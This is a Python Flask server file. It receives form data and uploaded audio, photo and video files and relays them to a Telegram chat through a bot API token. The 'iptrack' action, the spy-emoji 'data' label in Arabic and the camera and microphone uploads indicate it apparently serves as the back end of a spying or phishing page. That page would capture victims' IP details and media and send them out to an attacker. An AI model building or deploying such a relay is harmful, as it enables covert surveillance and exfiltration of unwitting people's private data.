import os
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    chat_id = request.form.get('chatId')
    action_type = request.form.get('type')
    
    if not chat_id:
        return jsonify({"error": "No chat ID"}), 400

    if action_type == 'info' or action_type == 'iptrack':
        data = request.form.get('data')
        url = f"{TELEGRAM_API}/sendMessage"
        payload = {"chat_id": chat_id, "text": f"🕵️‍♂️ *البيانات:*\n\n{data}", "parse_mode": "Markdown"}
        requests.post(url, json=payload)
        return jsonify({"status": "success"})

    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
        
    file = request.files['file']
    
    if action_type == 'audio':
        requests.post(f"{TELEGRAM_API}/sendAudio", files={'audio': ('audio.webm', file.read())}, data={'chat_id': chat_id})
    elif action_type == 'photo':
        requests.post(f"{TELEGRAM_API}/sendPhoto", files={'photo': ('photo.jpg', file.read())}, data={'chat_id': chat_id})
    elif action_type == 'video':
        requests.post(f"{TELEGRAM_API}/sendVideo", files={'video': ('video.webm', file.read())}, data={'chat_id': chat_id})

    return jsonify({"status": "uploaded"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
